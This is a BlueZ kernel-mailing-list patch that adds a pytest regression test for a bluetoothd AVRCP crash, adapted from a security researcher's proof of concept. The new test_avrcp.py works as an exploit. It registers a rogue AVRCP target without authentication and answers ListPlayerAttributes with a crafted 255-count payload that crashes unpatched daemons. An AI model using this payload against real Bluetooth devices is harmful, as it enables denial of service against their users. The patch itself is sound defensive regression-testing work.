Received: from meesny.iki.fi (meesny.iki.fi [195.140.195.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 713C13B71C9
	for <linux-bluetooth@vger.kernel.org>; Sun,  6 Sep 2026 16:50:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=195.140.195.201
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788713449; cv=pass; b=ijRWBum9MO9J/KVgY1GbxvsiXzJgcVjiyasgoOl4wItfiiOZSXpuB51OI+D+I2YFcbad0a3/waG6IfUe1NIFtawjwLx6THafETu1SmclqAm2PmqevGM53dwaNjh0/4qVjmS+KwA5ElwhtUzY6tyjHfIe3WlxVPZAlBBi9/B/Xjs=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788713449; c=relaxed/simple;
	bh=uljOoWVI2rEuRbWF3ChnumsbM++oCWoci8UbD2XcFBI=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=sq4lT2FgEbROrD6TbtZiJOaYH4VuRzjiPILLFXxa6Hzx7vOvTpgXeiaUnU8XyUD8uoEYT4NylvSwbQGL1B7BsIvci8rVm04ZFw+MZxUeejYhWRC7xo9B7WsUDRMwN7mG9kww49JZ+LZ2ahX2Jy2ZIHbeC8w/LN7KJfgJJvK/FQE=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi; spf=pass smtp.mailfrom=iki.fi; dkim=pass (1024-bit key) header.d=iki.fi header.i=@iki.fi header.b=O1h1NcMl; arc=pass smtp.client-ip=195.140.195.201
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iki.fi
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=iki.fi header.i=@iki.fi header.b="O1h1NcMl"
Received: from monolith.lan (unknown [IPv6:2a02:ed04:3581:2::d001])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange x25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	(Authenticated sender: pav)
	by meesny.iki.fi (Postfix) with ESMTPSA id 4hdGRL5T8Nz10Sn;
	Sun, 06 Sep 2026 19:50:38 +0300 (EEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi; s=meesny;
	t=1788713439;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=1NYn1dDtef//4NmeDFIHLHQIZuguiV0moWvOuHh5U6Y=;
	b=O1h1NcMl3LeyhEx3TllgNe7udZPWc68NqCqMY/WBwD/n+bqRArZkvH4FEZyBLGWEG27WV9
	Ud/igl/+73OV99i8E+HA3lWvoo7VDREIPsbN0pBR40r5xRhF5UNnJBWUzWK+oLqSVKTYhj
	gHxlQiiTXoKOE+KbEtPq2clV8aZOp54=
ARC-Seal: i=1; a=rsa-sha256; d=iki.fi; s=meesny; cv=none; t=1788713439;
	b=XopJcWdHZKS0fHWk/35hWf9GfBYRphN1EVbtopCNwB89VeVzHWa3GbMHHT+uswir2HeZyP
	6ZFbkM4/kQUzFUr7t9HPP0lXnYPsH6Z9Scdmf41GsAy8wMcvu2oNZJPGslszAX983HZkxX
	dcvD95snlXfShcbFUAsXKwQ6FLnQN/M=
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi;
	s=meesny; t=1788713439;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=1NYn1dDtef//4NmeDFIHLHQIZuguiV0moWvOuHh5U6Y=;
	b=uGYehzqjPvCuTsXBT2p68L1Hge5q8zRXU3s2WLBiBaMK7k6AqcvFPpcrrLvFnF3DQktj0V
	ndlM2CTYQ9DWdzWKwrJr7jHaN8vC0SDNyLKkTM1C3UtQ1oFB7JJ+BNo6T5EitIVU14RWet
	pkyvxrehN1g3TBea1DNeeeXjTRI2c4c=
ARC-Authentication-Results: i=1;
	ORIGINATING;
	auth=pass smtp.auth=pav smtp.mailfrom=pav@iki.fi
From: Pauli Virtanen <pav@iki.fi>
To: linux-bluetooth@vger.kernel.org
Cc: Pauli Virtanen <pav@iki.fi>
Subject: [PATCH BlueZ v7 9/9] test: functional: add test for AVRCP crash
Date: Sun,  6 Sep 2026 19:49:51 +0300
Message-ID: <ee00e490c4ba376f0d140258a6d5044ffe9b1b04.1788712996.git.pav@iki.fi>
X-Mailer: git-send-email 2.55.0
In-Reply-To: <cover.1788712996.git.pav@iki.fi>
References: <cover.1788712996.git.pav@iki.fi>
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Add test checking AVRCP ListPlayerAttributes crash.
From PoC provided by Alexandro Calo' (Nozomi Networks Labs)

Refactor test_obex.paired_hosts fixture to global fixture.
---
 test/functional/conftest.py   |  12 ++
 test/functional/test_avrcp.py | 281 ++++++++++++++++++++++++++++++++++
 test/functional/test_obex.py  |  19 +--
 3 files changed, 297 insertions(+), 15 deletions(-)
 create mode 100644 test/functional/test_avrcp.py

diff --git a/test/functional/conftest.py b/test/functional/conftest.py
index 9e3f6c50d..6f50efe0e 100644
--- a/test/functional/conftest.py
+++ b/test/functional/conftest.py
@@ -3,6 +3,7 @@
 import os
 import re
 from pathlib import Path
+import pytest
 
 
 def pytest_addoption(parser):
@@ -62,3 +63,14 @@ def pytest_collection_modifyitems(session, config, items):
         # Add security advisory marks based on test name
         if sa_re.search(item.name):
             item.add_marker(pytest.mark.sa)
+
+
+@pytest.fixture
+def paired_hosts_bredr(hosts):
+    from .test_agent import test_agent_pair_bredr
+
+    if hosts[0].agent.has_device(hosts[1].bdaddr):
+        return hosts
+
+    test_agent_pair_bredr(hosts, True)
+    return hosts
diff --git a/test/functional/test_avrcp.py b/test/functional/test_avrcp.py
new file mode 100644
index 000000000..3b04c9615
--- /dev/null
+++ b/test/functional/test_avrcp.py
@@ -0,0 +1,281 @@
+# -*- coding: utf-8; mode: python; eval: (blacken-mode); -*-
+# SPDX-License-Identifier: LGPL-2.1-or-later
+import uuid
+import threading
+import time
+import select
+import os
+import subprocess
+import struct
+
+import pytest
+import dbus
+
+from pytest_bluezenv import (
+    host_config,
+    Bluetoothd,
+    Agent,
+    wait_until,
+    mainloop_wrap,
+    get_dbus,
+    HostPlugin,
+)
+
+
+class CheckAvrcpCrash_GHSA_m2vx_pw5f_rc8v(HostPlugin):
+    name = "avrcp_crash"
+
+    @mainloop_wrap
+    def setup(self, impl):
+        self.bus = get_dbus()
+        self.profile = check_avrcp_GHSA_m2vx_pw5f_rc8v(self.bus)
+        print("[*] waiting for victim AVRCP connection", flush=True)
+
+    def wait_done(self):
+        return self.profile.wait_done()
+
+
+@host_config(
+    [Agent()],
+    [
+        Bluetoothd(args=("-d", "-P", "avrcp")),
+        CheckAvrcpCrash_GHSA_m2vx_pw5f_rc8v(),
+        Agent(),
+    ],
+)
+def test_avrcp_GHSA_m2vx_pw5f_rc8v(paired_hosts_bredr):
+    client, server = paired_hosts_bredr
+
+    client.agent.device_method(
+        server.bdaddr, "ConnectProfile", "0000110c-0000-1000-8000-00805f9b34fb"
+    )
+    client.agent.expect("org.bluez.Device1.ConnectProfile:reply")
+
+    assert server.avrcp_crash.wait_done()
+
+    # Bluetoothd shall not have crashed, and still respond
+    client.agent.device_method(server.bdaddr, "Disconnect")
+    client.agent.expect("org.bluez.Device1.Disconnect:reply")
+
+
+def check_avrcp_GHSA_m2vx_pw5f_rc8v(bus):
+    """NN-2026-0145 AVRCP PoC. BlueZ supplies the accepted AVCTP file
+    descriptor through Profile1.NewConnection.
+
+    """
+
+    PSM_AVCTP = 0x17
+    AVC_PID = 0x110E
+    AVCTP_COMMAND = 0
+    AVCTP_RESPONSE = 1
+    AVC_CTYPE_ACCEPTED = 0x09
+    AVC_CTYPE_STABLE = 0x0C
+    AVC_OP_VENDORDEP = 0x00
+    AVC_SUBUNIT_PANEL = 0x09
+
+    PDU_GET_CAPABILITIES = 0x10
+    PDU_LIST_PLAYER_ATTRS = 0x11
+    PDU_GET_CURRENT_PLAYER_VALUE = 0x13
+    PDU_REGISTER_NOTIFICATION = 0x31
+    CAP_EVENTS_SUPPORTED = 0x03
+    EVENT_TRACK_CHANGED = 0x02
+    COMPANY_BTSIG = b"\x00\x19\x58"
+
+    SDP_TG_RECORD = """<?xml version="1.0" encoding="UTF-8" ?>
+    <record>
+      <attribute id="0x0001">
+        <sequence><uuid value="0x110c"/><uuid value="0x110e"/></sequence>
+      </attribute>
+      <attribute id="0x0004">
+        <sequence>
+          <sequence><uuid value="0x0100"/><uint16 value="0x0017"/></sequence>
+          <sequence><uuid value="0x0017"/><uint16 value="0x0104"/></sequence>
+        </sequence>
+      </attribute>
+      <attribute id="0x0009">
+        <sequence><sequence><uuid value="0x110e"/><uint16 value="0x0104"/></sequence></sequence>
+      </attribute>
+      <attribute id="0x0311"><uint16 value="0x0011"/></attribute>
+    </record>
+    """
+
+    def hexdump(data):
+        if data is None:
+            return "<None>"
+        return " ".join("%02x" % byte for byte in data)
+
+    def send_all(fd, data):
+        view = memoryview(data)
+        while view:
+            count = os.write(fd, view)
+            if count <= 0:
+                raise OSError("AVCTP write made no progress")
+            view = view[count:]
+
+    def recv_one(fd):
+        readable, _, _ = select.select([fd], [], [], None)
+        if readable:
+            try:
+                return os.read(fd, 1024)
+            except OSError:
+                return None
+        return None
+
+    def avctp_header(transaction, command_response):
+        return bytes([(transaction << 4) | (command_response << 1)]) + struct.pack(
+            ">H", AVC_PID
+        )
+
+    def avc_frame(ctype, payload):
+        return bytes([ctype & 0x0F, AVC_SUBUNIT_PANEL << 3, AVC_OP_VENDORDEP]) + payload
+
+    def avrcp_pdu(pdu_id, params, packet_type=0):
+        return (
+            COMPANY_BTSIG
+            + bytes([pdu_id, packet_type])
+            + struct.pack(">H", len(params))
+            + params
+        )
+
+    def parse_avctp(data):
+        if len(data) < 3:
+            return None
+        return (data[0] >> 4, (data[0] >> 1) & 1, data[3:])
+
+    def parse_vendor(payload):
+        if len(payload) < 10 or payload[2] != AVC_OP_VENDORDEP:
+            return None
+        pdu_id = payload[6]
+        length = struct.unpack(">H", payload[8:10])[0]
+        return payload[0] & 0x0F, pdu_id, payload[10 : 10 + length]
+
+    class AvrcpTarget:
+        def __init__(self):
+            self.fd = -1
+            self.event = threading.Event()
+
+        def response(self, transaction, ctype, pdu):
+            frame = avctp_header(transaction, AVCTP_RESPONSE) + avc_frame(ctype, pdu)
+            print("-> " + hexdump(frame), flush=True)
+            send_all(self.fd, frame)
+
+        def loop(self):
+            while self.fd >= 0:
+                data = recv_one(self.fd)
+                if data == b"":
+                    print("[*] peer closed AVCTP", flush=True)
+                    return
+
+                print("<- " + hexdump(data), flush=True)
+                header = parse_avctp(data)
+                if not header:
+                    continue
+                transaction, command_response, payload = header
+                if command_response != AVCTP_COMMAND:
+                    continue
+
+                vendor = parse_vendor(payload)
+                if not vendor:
+                    send_all(
+                        self.fd,
+                        avctp_header(transaction, AVCTP_RESPONSE)
+                        + bytes([AVC_CTYPE_ACCEPTED])
+                        + payload[1:],
+                    )
+                    continue
+
+                _, pdu_id, params = vendor
+                if pdu_id == PDU_GET_CAPABILITIES:
+                    caps = bytes([CAP_EVENTS_SUPPORTED, 1, EVENT_TRACK_CHANGED])
+                    self.response(
+                        transaction,
+                        AVC_CTYPE_STABLE,
+                        avrcp_pdu(PDU_GET_CAPABILITIES, caps),
+                    )
+                elif pdu_id == PDU_LIST_PLAYER_ATTRS:
+                    evil = bytes([0xFF]) + bytes(
+                        (index % 4) + 1 for index in range(255)
+                    )
+                    print(
+                        "[+] answering ListPlayerAttributes with count=255", flush=True
+                    )
+                    self.response(
+                        transaction,
+                        AVC_CTYPE_STABLE,
+                        avrcp_pdu(PDU_LIST_PLAYER_ATTRS, evil),
+                    )
+
+                    self.event.set()
+                elif pdu_id == PDU_GET_CURRENT_PLAYER_VALUE:
+                    print(
+                        "[+] received current-player-value data: %s" % hexdump(params),
+                        flush=True,
+                    )
+                elif pdu_id == PDU_REGISTER_NOTIFICATION:
+                    print("[*] RegisterNotification: %s" % hexdump(params), flush=True)
+                else:
+                    self.response(transaction, 0x0A, avrcp_pdu(pdu_id, b"\x00"))
+
+    class Profile(dbus.service.Object):
+        def __init__(self, bus, path, target):
+            super().__init__(bus, path)
+            self.target = target
+            self.fd = -1
+
+        @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
+        def Release(self):
+            self.close()
+
+        @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
+        def Cancel(self):
+            pass
+
+        @dbus.service.method(
+            "org.bluez.Profile1", in_signature="oha{sv}", out_signature=""
+        )
+        def NewConnection(self, device, fd, properties):
+            self.close()
+            self.fd = fd.take()
+            os.set_blocking(self.fd, True)
+            self.target.fd = self.fd
+            print("[+] AVRCP connection from %s" % device, flush=True)
+            threading.Thread(target=self.target.loop, daemon=True).start()
+
+        @dbus.service.method("org.bluez.Profile1", in_signature="o", out_signature="")
+        def RequestDisconnection(self, device):
+            self.close()
+
+        def wait_done(self):
+            return self.target.event.wait()
+
+        def close(self):
+            if self.fd >= 0:
+                try:
+                    os.close(self.fd)
+                except OSError:
+                    pass
+                self.fd = -1
+                self.target.fd = -1
+
+    def register_profile(bus, target):
+        profile = Profile(bus, "/bluez_poc/nn20260145", target)
+        manager = dbus.Interface(
+            bus.get_object("org.bluez", "/org/bluez"), "org.bluez.ProfileManager1"
+        )
+        options = {
+            "ServiceRecord": dbus.String(SDP_TG_RECORD),
+            "Role": dbus.String("server"),
+            "PSM": dbus.UInt16(PSM_AVCTP),
+            "RequireAuthentication": dbus.Boolean(False),
+            "RequireAuthorization": dbus.Boolean(False),
+        }
+        manager.RegisterProfile(
+            dbus.ObjectPath("/bluez_poc/nn20260145"),
+            dbus.String(str(uuid.uuid4())),
+            options,
+        )
+        print("[+] AVRCP Target profile registered on PSM 0x17", flush=True)
+        return profile
+
+    target = AvrcpTarget()
+    return register_profile(bus, target)
diff --git a/test/functional/test_obex.py b/test/functional/test_obex.py
index 345b61326..79a217eae 100644
--- a/test/functional/test_obex.py
+++ b/test/functional/test_obex.py
@@ -186,17 +186,6 @@ class ObexClient(HostPlugin, EventPluginMixin):
         return properties["Filename"]
 
 
-@pytest.fixture
-def paired_hosts(hosts):
-    from .test_agent import test_agent_pair_bredr
-
-    if hosts[0].agent.has_device(hosts[1].bdaddr):
-        return hosts
-
-    test_agent_pair_bredr(hosts, True)
-    return hosts
-
-
 obex_host_config = host_config(
     [Agent(), Obexd(), ObexClient(), Pexpect()],
     [Agent(), Obexd(), ObexAgent()],
@@ -205,11 +194,11 @@ obex_host_config = host_config(
 
 
 @pytest.fixture
-def obex_hosts(paired_hosts):
-    host0, host1 = paired_hosts
+def obex_hosts(paired_hosts_bredr):
+    host0, host1 = paired_hosts_bredr
 
     if hasattr(host0, "session"):
-        return paired_hosts
+        return paired_hosts_bredr
 
     host0.obex.connect(host1.bdaddr)
 
@@ -219,7 +208,7 @@ def obex_hosts(paired_hosts):
 
     host0.obex.expect("org.bluez.obex.Client1.CreateSession:reply")
 
-    yield paired_hosts
+    yield paired_hosts_bredr
 
     host1.obex_agent.cleanup()
 
-- 
2.55.0

